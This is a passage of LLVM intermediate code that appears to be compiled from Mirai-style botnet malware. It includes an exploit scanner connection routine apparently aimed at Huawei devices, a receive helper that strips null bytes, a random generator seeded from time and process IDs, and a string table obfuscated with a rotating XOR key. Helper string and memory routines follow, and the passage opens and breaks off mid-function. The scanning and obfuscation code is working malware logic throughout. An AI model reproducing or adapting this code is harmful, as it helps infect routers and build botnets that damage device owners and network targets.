  store i32 %10, i32* %4, align 8
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %35, label %12

; <label>:12:                                     ; preds = %9
  %13 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 5
  store i32 0, i32* %13, align 4
  %14 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 6, i64 0
  tail call void @util_zero(i8* %14, i32 256)
  %15 = load i32, i32* %4, align 8
  %16 = tail call i32 (i32, i32, ...) @fcntl(i32 %15, i32 3, i32 0) #8
  %17 = or i32 %16, 2048
  %18 = tail call i32 (i32, i32, ...) @fcntl(i32 %15, i32 4, i32 %17) #8
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 3
  %21 = load i32, i32* %20, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  store i32 %21, i32* %22, align 4
  %23 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 4
  %24 = load i16, i16* %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 1
  store i16 %24, i16* %25, align 2
  %26 = load i32, i32* @huawei_fake_time, align 4
  %27 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 1
  store i32 %26, i32* %27, align 4
  %28 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 2
  %29 = load i32, i32* %28, align 8
  %.off = add i32 %29, -3
  %switch = icmp ult i32 %.off, 2
  br i1 %switch, label %31, label %30

; <label>:30:                                     ; preds = %12
  store i32 1, i32* %28, align 8
  br label %31

; <label>:31:                                     ; preds = %12, %30
  %32 = load i32, i32* %4, align 8
  %33 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %34 = call i32 @connect(i32 %32, %struct.sockaddr* nonnull %33, i32 16) #8
  br label %35

; <label>:35:                                     ; preds = %9, %31
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @huawei_recv_strip_null(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = sext i32 %2 to i64
  %6 = tail call i64 @recv(i32 %0, i8* %1, i64 %5, i32 %3) #8
  %7 = trunc i64 %6 to i32
  %8 = icmp sgt i32 %7, 0
  br i1 %8, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %4
  %wide.trip.count = and i64 %6, 4294967295
  %min.iters.check = icmp ult i64 %wide.trip.count, 32
  br i1 %min.iters.check, label %.lr.ph.preheader77, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph.preheader
  %n.mod.vf = and i64 %6, 31
  %n.vec = sub nsw i64 %wide.trip.count, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %.lr.ph.preheader77, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %pred.store.continue76
  %index = phi i64 [ %index.next, %pred.store.continue76 ], [ 0, %vector.body.preheader ]
  %9 = getelementptr inbounds i8, i8* %1, i64 %index
  %10 = bitcast i8* %9 to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %10, align 1
  %11 = getelementptr i8, i8* %9, i64 16
  %12 = bitcast i8* %11 to <16 x i8>*
  %wide.load14 = load <16 x i8>, <16 x i8>* %12, align 1
  %13 = icmp eq <16 x i8> %wide.load, zeroinitializer
  %14 = icmp eq <16 x i8> %wide.load14, zeroinitializer
  %15 = extractelement <16 x i1> %13, i32 0
  br i1 %15, label %pred.store.if, label %pred.store.continue

pred.store.if:                                    ; preds = %vector.body
  %16 = getelementptr inbounds i8, i8* %1, i64 %index
  store i8 65, i8* %16, align 1
  br label %pred.store.continue

pred.store.continue:                              ; preds = %pred.store.if, %vector.body
  %17 = extractelement <16 x i1> %13, i32 1
  br i1 %17, label %pred.store.if15, label %pred.store.continue16

pred.store.if15:                                  ; preds = %pred.store.continue
  %18 = or i64 %index, 1
  %19 = getelementptr inbounds i8, i8* %1, i64 %18
  store i8 65, i8* %19, align 1
  br label %pred.store.continue16

pred.store.continue16:                            ; preds = %pred.store.if15, %pred.store.continue
  %20 = extractelement <16 x i1> %13, i32 2
  br i1 %20, label %pred.store.if17, label %pred.store.continue18

pred.store.if17:                                  ; preds = %pred.store.continue16
  %21 = or i64 %index, 2
  %22 = getelementptr inbounds i8, i8* %1, i64 %21
  store i8 65, i8* %22, align 1
  br label %pred.store.continue18

pred.store.continue18:                            ; preds = %pred.store.if17, %pred.store.continue16
  %23 = extractelement <16 x i1> %13, i32 3
  br i1 %23, label %pred.store.if19, label %pred.store.continue20

pred.store.if19:                                  ; preds = %pred.store.continue18
  %24 = or i64 %index, 3
  %25 = getelementptr inbounds i8, i8* %1, i64 %24
  store i8 65, i8* %25, align 1
  br label %pred.store.continue20

pred.store.continue20:                            ; preds = %pred.store.if19, %pred.store.continue18
  %26 = extractelement <16 x i1> %13, i32 4
  br i1 %26, label %pred.store.if21, label %pred.store.continue22

pred.store.if21:                                  ; preds = %pred.store.continue20
  %27 = or i64 %index, 4
  %28 = getelementptr inbounds i8, i8* %1, i64 %27
  store i8 65, i8* %28, align 1
  br label %pred.store.continue22

pred.store.continue22:                            ; preds = %pred.store.if21, %pred.store.continue20
  %29 = extractelement <16 x i1> %13, i32 5
  br i1 %29, label %pred.store.if23, label %pred.store.continue24

pred.store.if23:                                  ; preds = %pred.store.continue22
  %30 = or i64 %index, 5
  %31 = getelementptr inbounds i8, i8* %1, i64 %30
  store i8 65, i8* %31, align 1
  br label %pred.store.continue24

pred.store.continue24:                            ; preds = %pred.store.if23, %pred.store.continue22
  %32 = extractelement <16 x i1> %13, i32 6
  br i1 %32, label %pred.store.if25, label %pred.store.continue26

pred.store.if25:                                  ; preds = %pred.store.continue24
  %33 = or i64 %index, 6
  %34 = getelementptr inbounds i8, i8* %1, i64 %33
  store i8 65, i8* %34, align 1
  br label %pred.store.continue26

pred.store.continue26:                            ; preds = %pred.store.if25, %pred.store.continue24
  %35 = extractelement <16 x i1> %13, i32 7
  br i1 %35, label %pred.store.if27, label %pred.store.continue28

pred.store.if27:                                  ; preds = %pred.store.continue26
  %36 = or i64 %index, 7
  %37 = getelementptr inbounds i8, i8* %1, i64 %36
  store i8 65, i8* %37, align 1
  br label %pred.store.continue28

pred.store.continue28:                            ; preds = %pred.store.if27, %pred.store.continue26
  %38 = extractelement <16 x i1> %13, i32 8
  br i1 %38, label %pred.store.if29, label %pred.store.continue30

pred.store.if29:                                  ; preds = %pred.store.continue28
  %39 = or i64 %index, 8
  %40 = getelementptr inbounds i8, i8* %1, i64 %39
  store i8 65, i8* %40, align 1
  br label %pred.store.continue30

pred.store.continue30:                            ; preds = %pred.store.if29, %pred.store.continue28
  %41 = extractelement <16 x i1> %13, i32 9
  br i1 %41, label %pred.store.if31, label %pred.store.continue32

pred.store.if31:                                  ; preds = %pred.store.continue30
  %42 = or i64 %index, 9
  %43 = getelementptr inbounds i8, i8* %1, i64 %42
  store i8 65, i8* %43, align 1
  br label %pred.store.continue32

pred.store.continue32:                            ; preds = %pred.store.if31, %pred.store.continue30
  %44 = extractelement <16 x i1> %13, i32 10
  br i1 %44, label %pred.store.if33, label %pred.store.continue34

pred.store.if33:                                  ; preds = %pred.store.continue32
  %45 = or i64 %index, 10
  %46 = getelementptr inbounds i8, i8* %1, i64 %45
  store i8 65, i8* %46, align 1
  br label %pred.store.continue34

pred.store.continue34:                            ; preds = %pred.store.if33, %pred.store.continue32
  %47 = extractelement <16 x i1> %13, i32 11
  br i1 %47, label %pred.store.if35, label %pred.store.continue36

pred.store.if35:                                  ; preds = %pred.store.continue34
  %48 = or i64 %index, 11
  %49 = getelementptr inbounds i8, i8* %1, i64 %48
  store i8 65, i8* %49, align 1
  br label %pred.store.continue36

pred.store.continue36:                            ; preds = %pred.store.if35, %pred.store.continue34
  %50 = extractelement <16 x i1> %13, i32 12
  br i1 %50, label %pred.store.if37, label %pred.store.continue38

pred.store.if37:                                  ; preds = %pred.store.continue36
  %51 = or i64 %index, 12
  %52 = getelementptr inbounds i8, i8* %1, i64 %51
  store i8 65, i8* %52, align 1
  br label %pred.store.continue38

pred.store.continue38:                            ; preds = %pred.store.if37, %pred.store.continue36
  %53 = extractelement <16 x i1> %13, i32 13
  br i1 %53, label %pred.store.if39, label %pred.store.continue40

pred.store.if39:                                  ; preds = %pred.store.continue38
  %54 = or i64 %index, 13
  %55 = getelementptr inbounds i8, i8* %1, i64 %54
  store i8 65, i8* %55, align 1
  br label %pred.store.continue40

pred.store.continue40:                            ; preds = %pred.store.if39, %pred.store.continue38
  %56 = extractelement <16 x i1> %13, i32 14
  br i1 %56, label %pred.store.if41, label %pred.store.continue42

pred.store.if41:                                  ; preds = %pred.store.continue40
  %57 = or i64 %index, 14
  %58 = getelementptr inbounds i8, i8* %1, i64 %57
  store i8 65, i8* %58, align 1
  br label %pred.store.continue42

pred.store.continue42:                            ; preds = %pred.store.if41, %pred.store.continue40
  %59 = extractelement <16 x i1> %13, i32 15
  br i1 %59, label %pred.store.if43, label %pred.store.continue44

pred.store.if43:                                  ; preds = %pred.store.continue42
  %60 = or i64 %index, 15
  %61 = getelementptr inbounds i8, i8* %1, i64 %60
  store i8 65, i8* %61, align 1
  br label %pred.store.continue44

pred.store.continue44:                            ; preds = %pred.store.if43, %pred.store.continue42
  %62 = extractelement <16 x i1> %14, i32 0
  br i1 %62, label %pred.store.if45, label %pred.store.continue46

pred.store.if45:                                  ; preds = %pred.store.continue44
  %63 = or i64 %index, 16
  %64 = getelementptr inbounds i8, i8* %1, i64 %63
  store i8 65, i8* %64, align 1
  br label %pred.store.continue46

pred.store.continue46:                            ; preds = %pred.store.if45, %pred.store.continue44
  %65 = extractelement <16 x i1> %14, i32 1
  br i1 %65, label %pred.store.if47, label %pred.store.continue48

pred.store.if47:                                  ; preds = %pred.store.continue46
  %66 = or i64 %index, 17
  %67 = getelementptr inbounds i8, i8* %1, i64 %66
  store i8 65, i8* %67, align 1
  br label %pred.store.continue48

pred.store.continue48:                            ; preds = %pred.store.if47, %pred.store.continue46
  %68 = extractelement <16 x i1> %14, i32 2
  br i1 %68, label %pred.store.if49, label %pred.store.continue50

pred.store.if49:                                  ; preds = %pred.store.continue48
  %69 = or i64 %index, 18
  %70 = getelementptr inbounds i8, i8* %1, i64 %69
  store i8 65, i8* %70, align 1
  br label %pred.store.continue50

pred.store.continue50:                            ; preds = %pred.store.if49, %pred.store.continue48
  %71 = extractelement <16 x i1> %14, i32 3
  br i1 %71, label %pred.store.if51, label %pred.store.continue52

pred.store.if51:                                  ; preds = %pred.store.continue50
  %72 = or i64 %index, 19
  %73 = getelementptr inbounds i8, i8* %1, i64 %72
  store i8 65, i8* %73, align 1
  br label %pred.store.continue52

pred.store.continue52:                            ; preds = %pred.store.if51, %pred.store.continue50
  %74 = extractelement <16 x i1> %14, i32 4
  br i1 %74, label %pred.store.if53, label %pred.store.continue54

pred.store.if53:                                  ; preds = %pred.store.continue52
  %75 = or i64 %index, 20
  %76 = getelementptr inbounds i8, i8* %1, i64 %75
  store i8 65, i8* %76, align 1
  br label %pred.store.continue54

pred.store.continue54:                            ; preds = %pred.store.if53, %pred.store.continue52
  %77 = extractelement <16 x i1> %14, i32 5
  br i1 %77, label %pred.store.if55, label %pred.store.continue56

pred.store.if55:                                  ; preds = %pred.store.continue54
  %78 = or i64 %index, 21
  %79 = getelementptr inbounds i8, i8* %1, i64 %78
  store i8 65, i8* %79, align 1
  br label %pred.store.continue56

pred.store.continue56:                            ; preds = %pred.store.if55, %pred.store.continue54
  %80 = extractelement <16 x i1> %14, i32 6
  br i1 %80, label %pred.store.if57, label %pred.store.continue58

pred.store.if57:                                  ; preds = %pred.store.continue56
  %81 = or i64 %index, 22
  %82 = getelementptr inbounds i8, i8* %1, i64 %81
  store i8 65, i8* %82, align 1
  br label %pred.store.continue58

pred.store.continue58:                            ; preds = %pred.store.if57, %pred.store.continue56
  %83 = extractelement <16 x i1> %14, i32 7
  br i1 %83, label %pred.store.if59, label %pred.store.continue60

pred.store.if59:                                  ; preds = %pred.store.continue58
  %84 = or i64 %index, 23
  %85 = getelementptr inbounds i8, i8* %1, i64 %84
  store i8 65, i8* %85, align 1
  br label %pred.store.continue60

pred.store.continue60:                            ; preds = %pred.store.if59, %pred.store.continue58
  %86 = extractelement <16 x i1> %14, i32 8
  br i1 %86, label %pred.store.if61, label %pred.store.continue62

pred.store.if61:                                  ; preds = %pred.store.continue60
  %87 = or i64 %index, 24
  %88 = getelementptr inbounds i8, i8* %1, i64 %87
  store i8 65, i8* %88, align 1
  br label %pred.store.continue62

pred.store.continue62:                            ; preds = %pred.store.if61, %pred.store.continue60
  %89 = extractelement <16 x i1> %14, i32 9
  br i1 %89, label %pred.store.if63, label %pred.store.continue64

pred.store.if63:                                  ; preds = %pred.store.continue62
  %90 = or i64 %index, 25
  %91 = getelementptr inbounds i8, i8* %1, i64 %90
  store i8 65, i8* %91, align 1
  br label %pred.store.continue64

pred.store.continue64:                            ; preds = %pred.store.if63, %pred.store.continue62
  %92 = extractelement <16 x i1> %14, i32 10
  br i1 %92, label %pred.store.if65, label %pred.store.continue66

pred.store.if65:                                  ; preds = %pred.store.continue64
  %93 = or i64 %index, 26
  %94 = getelementptr inbounds i8, i8* %1, i64 %93
  store i8 65, i8* %94, align 1
  br label %pred.store.continue66

pred.store.continue66:                            ; preds = %pred.store.if65, %pred.store.continue64
  %95 = extractelement <16 x i1> %14, i32 11
  br i1 %95, label %pred.store.if67, label %pred.store.continue68

pred.store.if67:                                  ; preds = %pred.store.continue66
  %96 = or i64 %index, 27
  %97 = getelementptr inbounds i8, i8* %1, i64 %96
  store i8 65, i8* %97, align 1
  br label %pred.store.continue68

pred.store.continue68:                            ; preds = %pred.store.if67, %pred.store.continue66
  %98 = extractelement <16 x i1> %14, i32 12
  br i1 %98, label %pred.store.if69, label %pred.store.continue70

pred.store.if69:                                  ; preds = %pred.store.continue68
  %99 = or i64 %index, 28
  %100 = getelementptr inbounds i8, i8* %1, i64 %99
  store i8 65, i8* %100, align 1
  br label %pred.store.continue70

pred.store.continue70:                            ; preds = %pred.store.if69, %pred.store.continue68
  %101 = extractelement <16 x i1> %14, i32 13
  br i1 %101, label %pred.store.if71, label %pred.store.continue72

pred.store.if71:                                  ; preds = %pred.store.continue70
  %102 = or i64 %index, 29
  %103 = getelementptr inbounds i8, i8* %1, i64 %102
  store i8 65, i8* %103, align 1
  br label %pred.store.continue72

pred.store.continue72:                            ; preds = %pred.store.if71, %pred.store.continue70
  %104 = extractelement <16 x i1> %14, i32 14
  br i1 %104, label %pred.store.if73, label %pred.store.continue74

pred.store.if73:                                  ; preds = %pred.store.continue72
  %105 = or i64 %index, 30
  %106 = getelementptr inbounds i8, i8* %1, i64 %105
  store i8 65, i8* %106, align 1
  br label %pred.store.continue74

pred.store.continue74:                            ; preds = %pred.store.if73, %pred.store.continue72
  %107 = extractelement <16 x i1> %14, i32 15
  br i1 %107, label %pred.store.if75, label %pred.store.continue76

pred.store.if75:                                  ; preds = %pred.store.continue74
  %108 = or i64 %index, 31
  %109 = getelementptr inbounds i8, i8* %1, i64 %108
  store i8 65, i8* %109, align 1
  br label %pred.store.continue76

pred.store.continue76:                            ; preds = %pred.store.if75, %pred.store.continue74
  %index.next = add i64 %index, 32
  %110 = icmp eq i64 %index.next, %n.vec
  br i1 %110, label %middle.block, label %vector.body, !llvm.loop !15

middle.block:                                     ; preds = %pred.store.continue76
  %cmp.n = icmp eq i64 %n.mod.vf, 0
  br i1 %cmp.n, label %.loopexit, label %.lr.ph.preheader77

.lr.ph.preheader77:                               ; preds = %middle.block, %min.iters.checked, %.lr.ph.preheader
  %indvars.iv.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph.preheader ], [ %n.vec, %middle.block ]
  %111 = sub i64 %6, %indvars.iv.ph
  %112 = add nsw i64 %wide.trip.count, -1
  %113 = sub nsw i64 %112, %indvars.iv.ph
  %xtraiter = and i64 %111, 3
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader77
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %118, %.lr.ph.prol.preheader
  %indvars.iv.prol = phi i64 [ %indvars.iv.next.prol, %118 ], [ %indvars.iv.ph, %.lr.ph.prol.preheader ]
  %prol.iter = phi i64 [ %prol.iter.sub, %118 ], [ %xtraiter, %.lr.ph.prol.preheader ]
  %114 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.prol
  %115 = load i8, i8* %114, align 1
  %116 = icmp eq i8 %115, 0
  br i1 %116, label %117, label %118

; <label>:117:                                    ; preds = %.lr.ph.prol
  store i8 65, i8* %114, align 1
  br label %118

; <label>:118:                                    ; preds = %117, %.lr.ph.prol
  %indvars.iv.next.prol = add nuw nsw i64 %indvars.iv.prol, 1
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph.prol.loopexit.unr-lcssa, label %.lr.ph.prol, !llvm.loop !16

.lr.ph.prol.loopexit.unr-lcssa:                   ; preds = %118
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader77, %.lr.ph.prol.loopexit.unr-lcssa
  %indvars.iv.unr = phi i64 [ %indvars.iv.ph, %.lr.ph.preheader77 ], [ %indvars.iv.next.prol, %.lr.ph.prol.loopexit.unr-lcssa ]
  %119 = icmp ult i64 %113, 3
  br i1 %119, label %.loopexit.loopexit, label %.lr.ph.preheader77.new

.lr.ph.preheader77.new:                           ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %136, %.lr.ph.preheader77.new
  %indvars.iv = phi i64 [ %indvars.iv.unr, %.lr.ph.preheader77.new ], [ %indvars.iv.next.3, %136 ]
  %120 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv
  %121 = load i8, i8* %120, align 1
  %122 = icmp eq i8 %121, 0
  br i1 %122, label %123, label %.lr.ph.178

; <label>:123:                                    ; preds = %.lr.ph
  store i8 65, i8* %120, align 1
  br label %.lr.ph.178

.lr.ph.178:                                       ; preds = %.lr.ph, %123
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %124 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next
  %125 = load i8, i8* %124, align 1
  %126 = icmp eq i8 %125, 0
  br i1 %126, label %127, label %.lr.ph.279

.loopexit.loopexit.unr-lcssa:                     ; preds = %136
  br label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.lr.ph.prol.loopexit, %.loopexit.loopexit.unr-lcssa
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %middle.block, %4
  ret i32 %7

; <label>:127:                                    ; preds = %.lr.ph.178
  store i8 65, i8* %124, align 1
  br label %.lr.ph.279

.lr.ph.279:                                       ; preds = %127, %.lr.ph.178
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %128 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.1
  %129 = load i8, i8* %128, align 1
  %130 = icmp eq i8 %129, 0
  br i1 %130, label %131, label %.lr.ph.380

; <label>:131:                                    ; preds = %.lr.ph.279
  store i8 65, i8* %128, align 1
  br label %.lr.ph.380

.lr.ph.380:                                       ; preds = %131, %.lr.ph.279
  %indvars.iv.next.2 = add nsw i64 %indvars.iv, 3
  %132 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.2
  %133 = load i8, i8* %132, align 1
  %134 = icmp eq i8 %133, 0
  br i1 %134, label %135, label %136

; <label>:135:                                    ; preds = %.lr.ph.380
  store i8 65, i8* %132, align 1
  br label %136

; <label>:136:                                    ; preds = %135, %.lr.ph.380
  %indvars.iv.next.3 = add nsw i64 %indvars.iv, 4
  %exitcond.3 = icmp eq i64 %indvars.iv.next.3, %wide.trip.count
  br i1 %exitcond.3, label %.loopexit.loopexit.unr-lcssa, label %.lr.ph, !llvm.loop !17
}

; Function Attrs: noinline nounwind uwtable
define void @rand_init() local_unnamed_addr #1 {
  %1 = tail call i64 @time(i64* null) #8
  %2 = trunc i64 %1 to i32
  store i32 %2, i32* @x, align 4
  %3 = tail call i32 @getpid() #8
  %4 = tail call i32 @getppid() #8
  %5 = xor i32 %4, %3
  store i32 %5, i32* @y, align 4
  %6 = tail call i64 @clock() #8
  %7 = trunc i64 %6 to i32
  store i32 %7, i32* @z, align 4
  %8 = load i32, i32* @y, align 4
  %9 = xor i32 %8, %7
  store i32 %9, i32* @w, align 4
  ret void
}

; Function Attrs: nounwind
declare i32 @getppid() local_unnamed_addr #4

; Function Attrs: nounwind
declare i64 @clock() local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_next() local_unnamed_addr #0 {
  %1 = load i32, i32* @x, align 4
  %2 = shl i32 %1, 11
  %3 = xor i32 %2, %1
  %4 = lshr i32 %3, 8
  %5 = load i32, i32* @y, align 4
  store i32 %5, i32* @x, align 4
  %6 = load i32, i32* @z, align 4
  store i32 %6, i32* @y, align 4
  %7 = load i32, i32* @w, align 4
  store i32 %7, i32* @z, align 4
  %8 = lshr i32 %7, 19
  %9 = xor i32 %4, %3
  %10 = xor i32 %9, %7
  %11 = xor i32 %10, %8
  store i32 %11, i32* @w, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define void @table_init() local_unnamed_addr #1 {
  tail call fastcc void @add_entry(i8 zeroext 1, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.84, i64 0, i64 0), i32 14)
  tail call fastcc void @add_entry(i8 zeroext 2, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1.85, i64 0, i64 0), i32 19)
  tail call fastcc void @add_entry(i8 zeroext 3, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2.86, i64 0, i64 0), i32 23)
  tail call fastcc void @add_entry(i8 zeroext 4, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3.87, i64 0, i64 0), i32 24)
  tail call fastcc void @add_entry(i8 zeroext 5, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4.88, i64 0, i64 0), i32 15)
  tail call fastcc void @add_entry(i8 zeroext 6, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5.89, i64 0, i64 0), i32 22)
  tail call fastcc void @add_entry(i8 zeroext 7, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6.90, i64 0, i64 0), i32 15)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @add_entry(i8 zeroext, i8* nocapture readonly, i32) unnamed_addr #1 {
  %4 = sext i32 %2 to i64
  %5 = tail call noalias i8* @malloc(i64 %4) #8
  tail call void @util_memcpy(i8* %5, i8* %1, i32 %2)
  %6 = zext i8 %0 to i64
  %7 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %6, i32 0
  store i8* %5, i8** %7, align 16
  %8 = trunc i32 %2 to i16
  %9 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %6, i32 1
  store i16 %8, i16* %9, align 8
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_unlock_val(i8 zeroext) local_unnamed_addr #0 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc void @toggle_obf(i8 zeroext) unnamed_addr #0 {
  %2 = zext i8 %0 to i64
  %3 = load i32, i32* @table_key, align 4
  %4 = lshr i32 %3, 8
  %5 = lshr i32 %3, 16
  %6 = lshr i32 %3, 24
  %7 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %2, i32 1
  %8 = load i16, i16* %7, align 8
  %9 = icmp eq i16 %8, 0
  br i1 %9, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %1
  %10 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %2, i32 0
  br label %11

; <label>:11:                                     ; preds = %.lr.ph, %11
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %11 ]
  %12 = load i8*, i8** %10, align 16
  %13 = getelementptr inbounds i8, i8* %12, i64 %indvars.iv
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = xor i32 %15, %3
  %17 = trunc i32 %16 to i8
  store i8 %17, i8* %13, align 1
  %18 = load i8*, i8** %10, align 16
  %19 = getelementptr inbounds i8, i8* %18, i64 %indvars.iv
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = xor i32 %21, %4
  %23 = trunc i32 %22 to i8
  store i8 %23, i8* %19, align 1
  %24 = load i8*, i8** %10, align 16
  %25 = getelementptr inbounds i8, i8* %24, i64 %indvars.iv
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = xor i32 %27, %5
  %29 = trunc i32 %28 to i8
  store i8 %29, i8* %25, align 1
  %30 = load i8*, i8** %10, align 16
  %31 = getelementptr inbounds i8, i8* %30, i64 %indvars.iv
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = xor i32 %33, %6
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %31, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %36 = load i16, i16* %7, align 8
  %37 = zext i16 %36 to i64
  %38 = icmp slt i64 %indvars.iv.next, %37
  br i1 %38, label %11, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %11
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_lock_val(i8 zeroext) local_unnamed_addr #0 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) local_unnamed_addr #0 {
  %3 = sext i32 %0 to i64
  %4 = icmp eq i32* %1, null
  br i1 %4, label %9, label %5

; <label>:5:                                      ; preds = %2
  %6 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %3, i32 1
  %7 = load i16, i16* %6, align 8
  %8 = zext i16 %7 to i32
  store i32 %8, i32* %1, align 4
  br label %9

; <label>:9:                                      ; preds = %2, %5
  %10 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %3, i32 0
  %11 = load i8*, i8** %10, align 16
  ret i8* %11
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_strlen(i8* nocapture readonly) local_unnamed_addr #3 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.03 = phi i32 [ %5, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i8* [ %4, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %4 = getelementptr inbounds i8, i8* %.012, i64 1
  %5 = add nuw nsw i32 %.03, 1
  %6 = load i8, i8* %4, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.0.lcssa = phi i32 [ 0, %1 ], [ %5, %._crit_edge.loopexit ]
  ret i32 %.0.lcssa
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @util_strcpy(i8* nocapture, i8* nocapture readonly) local_unnamed_addr #0 {
  %3 = tail call i32 @util_strlen(i8* %1)
  %4 = add nsw i32 %3, 1
  tail call void @util_memcpy(i8* %0, i8* %1, i32 %4)
  ret i32 %3
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @util_memcpy(i8* nocapture, i8* nocapture readonly, i32) local_unnamed_addr #0 {
  %4 = icmp eq i32 %2, 0
  br i1 %4, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %3
  %5 = add i32 %2, -1
  %6 = zext i32 %5 to i64
  %7 = add nuw nsw i64 %6, 1
  %min.iters.check = icmp ult i64 %7, 32
  br i1 %min.iters.check, label %.lr.ph.preheader19, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph.preheader
  %n.vec = and i64 %7, 8589934560
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %.lr.ph.preheader19, label %vector.memcheck

vector.memcheck:                                  ; preds = %min.iters.checked
  %8 = add i32 %2, -1
  %9 = zext i32 %8 to i64
  %10 = add nuw nsw i64 %9, 1
  %scevgep = getelementptr i8, i8* %0, i64 %10
  %scevgep9 = getelementptr i8, i8* %1, i64 %10
  %bound0 = icmp ugt i8* %scevgep9, %0
  %bound1 = icmp ugt i8* %scevgep, %1
  %memcheck.conflict = and i1 %bound0, %bound1
  %ind.end = getelementptr i8, i8* %1, i64 %n.vec
